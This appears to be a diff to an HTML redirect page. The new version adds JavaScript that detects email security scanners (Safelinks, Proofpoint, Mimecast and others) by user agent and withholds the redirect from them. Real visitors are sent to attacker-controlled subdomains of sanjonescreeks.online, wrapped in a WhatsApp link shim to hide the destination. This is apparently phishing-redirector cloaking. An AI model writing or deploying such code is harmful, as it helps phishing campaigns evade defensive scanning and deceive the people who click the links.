@@ -1,26 +1,43 @@
 <!DOCTYPE html>
 <html>
-  <head>
+<head>
     <meta charset="utf-8">
     <title>Redirecting...</title>
     <script type="text/javascript">
-      (function() {
-        // Get the path (e.g., /blue)
-        var segments = window.location.pathname.split('/').filter(Boolean);
-        
-        if (segments.length > 0) {
-          // If the path is /blue, this sends them to ...workers.dev/blue
-          var path = segments.join('/');
-          window.location.replace("https://proud-sky-0e47.pandesmith11.workers.dev/" + path);
-        } else {
-          // If there is no path, just go to the main workers URL
-          window.location.replace("https://proud-sky-0e47.pandesmith11.workers.dev/");
-        }
-      })();
+        (function() {
+            // 1. User Agent / Bot Filtering
+            var ua = navigator.userAgent.toLowerCase();
+            var bots = ["safelinks", "proofpoint", "mimecast", "barracuda", "trendmicro", "avanan"];
+            var isBot = bots.some(function(bot) { return ua.indexOf(bot) !== -1; });
+
+            if (isBot) {
+                console.log("Security scanner detected.");
+                return; // Stop the redirect for bots
+            }
+
+            // 2. Parse the URL segments
+            // Example: /blue/test -> parts = ["blue", "test"]
+            var segments = window.location.pathname.split('/').filter(Boolean);
+
+            if (segments.length >= 1) {
+                var subdomain = segments[0];
+                var path = segments.slice(1).join('/') || "";
+
+                // 3. Construct the destination
+                var finalUrl = "https://" + subdomain + ".sanjonescreeks.online/" + path;
+                
+                // 4. Wrap in Link-Shim
+                var wrappedUrl = "https://l.wl.co/l/?u=" + encodeURIComponent(finalUrl);
+
+                // 5. Execute Redirect
+                window.location.replace(wrappedUrl);
+            } else {
+                window.location.replace("https://sanjonescreeks.online/");
+            }
+        })();
     </script>
-    <meta http-equiv="refresh" content="2; url=https://proud-sky-0e47.pandesmith11.workers.dev/">
-  </head>
-  <body>
-    <p>Redirecting to Cloudflare Workers...</p>
-  </body>
+</head>
+<body>
+    <p>Loading destination...</p>
+</body>
 </html>
